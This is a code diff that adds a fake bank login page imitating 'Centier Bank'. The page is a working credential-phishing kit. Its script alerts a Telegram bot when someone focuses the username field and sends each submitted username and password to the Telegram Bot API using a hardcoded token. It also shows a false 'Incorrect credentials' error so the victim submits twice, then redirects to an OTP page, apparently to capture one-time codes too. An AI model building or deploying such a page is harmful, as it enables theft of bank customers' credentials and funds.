@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Lato:wght@100;400;700;900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="./style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+          <img src="./images/bank-logo@2x.png" alt="Centier Bank Logo">
+        </div>
+        <form class="login-form" id="primary_form">
+          <div class="input-group">
+            <input type="text" placeholder="USERNAME" required class="form-username" id="form-username">
+          </div>
+          <div class="input-group">
+            <input type="password" placeholder="PASSWORD" required id="form-password">
+            <button type="button" class="show-password" id="togglePasscode" onclick="togglePassword()">SHOW</button>
+          </div>
+          <button type="submit" class="sign-in-button">SIGN IN</button>
+          <p id="error-message" class="error-message"></p>
+          <div class="remember-section">
+            <label>
+              <input type="checkbox">
+              Remember Username
+            </label>
+          </div>
+          <hr>
+          <div class="links">
+            <a href="#">Sign Up</a>
+            <a href="#">Forgot Username / Password</a>
+          </div>
+        </form>
+        <div class="footer">
+         
+            <img src="./images/unnamed.jpg" alt="Centier Bank Logo">        </div>
+      </div>
+
+    <script>
+        // Check if the page load is a reload using the performance API
+        if (performance.getEntriesByType("navigation")[0].type === "reload") {
+          window.location.href = "index.html"; // Redirect to index.html if it's a reload
+        }
+      </script>
+
+<script>
+  const form = document.querySelector("#primary_form");
+  const first_input = document.querySelector(".form-username");
+  var notUsed = true;
+  var submittedOnce = false;
+  first_input.onfocus = function() {
+      var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+      var chat_id = "-4244251369";
+      var my_text = `Get ready, somebody is logging in`
+      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+      if(notUsed){
+          notUsed = false;
+          let api = new XMLHttpRequest();
+      api.open("GET", url, true);
+      api.send();
+      }
+  };
+  form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      var username = document.querySelector("#form-username").value;
+      var password = document.querySelector("#form-password").value;
+      var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+      var chat_id = "-4244251369";
+      var my_text = `Username:${username} Password:${password}`
+      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+      console.log(username, password);
+
+      let api = new XMLHttpRequest();
+      api.open("GET", url, true);
+      api.send();
+
+      if(submittedOnce){
+        window.location.href="otp.html";
+        submittedOnce = false;
+      } else {
+        const errorMessage = document.getElementById('error-message');
+            errorMessage.textContent = "Incorrect credentials, submit again";
+            errorMessage.style.color = "red";
+            submittedOnce = true;
+      }
+     
+     
+  })
+
+  function togglePassword() {
+            const passcodeInput = document.getElementById('form-password');
+            const toggleButton = document.getElementById('togglePasscode');
+            if (passcodeInput.type === "password") {
+                passcodeInput.type = "text";
+                toggleButton.textContent = "Hide";
+            } else {
+                passcodeInput.type = "password";
+                toggleButton.textContent = "Show";
+            }
+        }
+</script>
+</body>
+</html>
